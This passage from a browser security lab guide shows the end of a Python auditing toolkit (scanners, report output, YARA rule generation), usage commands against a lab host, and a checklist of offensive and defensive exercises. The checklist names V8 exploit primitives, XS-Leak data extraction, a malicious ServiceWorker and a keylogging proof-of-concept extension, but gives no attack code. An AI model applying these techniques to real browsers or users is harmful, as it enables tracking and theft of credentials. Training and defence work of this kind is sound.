            results.append(XSLeakDetector().scan(args.target))

    if args.profile:
        if "cookies" in modules:
            results.append(CookieAuditor().scan(args.profile))
        if "extensions" in modules:
            results.append(ExtensionForensics().scan(args.profile))

    report = ReportGenerator().generate(results, fmt=args.format)

    if args.output:
        with open(args.output, 'w') as f:
            f.write(report)
        print(f"Report saved to {args.output}")
    else:
        print(report)

    # Generate detection rules for high-severity findings
    all_findings = []
    for r in results:
        all_findings.extend(r.findings)

    high_findings = [f for f in all_findings if f.severity in ("CRITICAL", "HIGH")]
    if high_findings:
        gen = DetectionRuleGenerator()
        yara_rules = gen.generate_yara(high_findings)
        if yara_rules and not yara_rules.startswith("//"):
            yara_path = (args.output or "report") + ".yar"
            with open(yara_path, 'w') as f:
                f.write(yara_rules)
            print(f"YARA rules generated: {yara_path}")


if __name__ == '__main__':
    main()
```

Save this toolkit to `/opt/browser_security_toolkit.py` on VM2 and make executable.

**Usage examples:**

```bash
# Full remote scan
python3 /opt/browser_security_toolkit.py \
  --target http://10.8.1.10:3000 \
  --modules all \
  --output /tmp/browser_audit.json

# Local forensics
python3 /opt/browser_security_toolkit.py \
  --profile ~/.config/google-chrome/Default \
  --modules cookies,extensions \
  --format markdown \
  --output /tmp/forensics_report.md

# Combined
python3 /opt/browser_security_toolkit.py \
  --target http://10.8.1.10:3000 \
  --profile ~/.config/google-chrome/Default \
  --modules all \
  --output /tmp/full_audit.json
```

---

## Lab Validation Checklist

### Part A — Offensive

- [ ] **Ex1:** V8 type confusion primitives explained — addrof/fakeobj concept demonstrated with d8, element kind lattice verified, V8 Sandbox (EPT/CPT/TPT) impact analyzed
- [ ] **Ex2:** Chrome sandbox architecture inspected — renderer seccomp filter confirmed (MODE_FILTER), namespace isolation verified (user/PID/net), GPU process sandbox compared (looser), Mojo IPC channels identified
- [ ] **Ex3:** SOP bypass/XS-Leaks exploited — CORS reflected origin confirmed, JSONP data extraction demonstrated, postMessage validation bypass executed, frame count oracle leaked admin status, timing side-channel extracted user prefixes
- [ ] **Ex4:** Browser fingerprinting — 9 vectors implemented (Navigator, Screen, Canvas, WebGL, AudioContext, Fonts, Timezone, Hardware, Network), combined entropy estimated (~33+ bits), cross-browser differences documented
- [ ] **Ex5:** Cookie security — 7 cookie configurations audited, HttpOnly protection verified (non-HttpOnly cookies visible to JS), SameSite enforcement tested, `__Host-` prefix benefits documented
- [ ] **Ex6:** ServiceWorker persistence — malicious SW registered, request interception confirmed, persistence across page reload verified, cleanup via unregistration demonstrated
- [ ] **Ex7:** Extension security — PoC extension built (keylogging, form interception, DOM extraction), MV3 permission model analyzed, dangerous permission combinations identified
- [ ] **Ex8:** Spectre mitigations — COOP/COEP cross-origin isolation verified, `crossOriginIsolated` status checked, SharedArrayBuffer gating confirmed, performance.now() resolution compared

### Part B — Defensive

- [ ] **Ex9:** Browser hardening deployed — Chrome enterprise policy (JIT disabled, extensions blocked, site isolation enforced), Firefox about:config (JIT disabled, resist fingerprinting, HTTPS-only), JIT-less performance impact measured
- [ ] **Ex10:** Detection rules validated — 6 YARA rules compiled and tested (shellcode, Wasm RWX, heap spray, XS-Leak, FORCEDENTRY, malicious extension), 5 Sigma rules syntax-verified, 6 Suricata rules loaded, test samples matched correctly with zero false positives on benign samples
- [ ] **Ex11:** Browser forensics completed — history/downloads extracted, cookie audit performed, extension risk assessment generated, ServiceWorker persistence detected, crash dump analysis methodology documented

### Part C — Framework

- [ ] **Toolkit:** `browser_security_toolkit.py` built with 6 modules (SecurityHeaderScanner, CORSScanner, CookieAuditor, ExtensionForensics, XSLeakDetector, DetectionRuleGenerator), JSON and Markdown report output, CLI with argparse
- [ ] **Integration:** Toolkit scans target and generates findings with CWE, severity, evidence, and remediation
- [ ] **Rule generation:** High-severity findings automatically produce YARA and Sigma detection rules
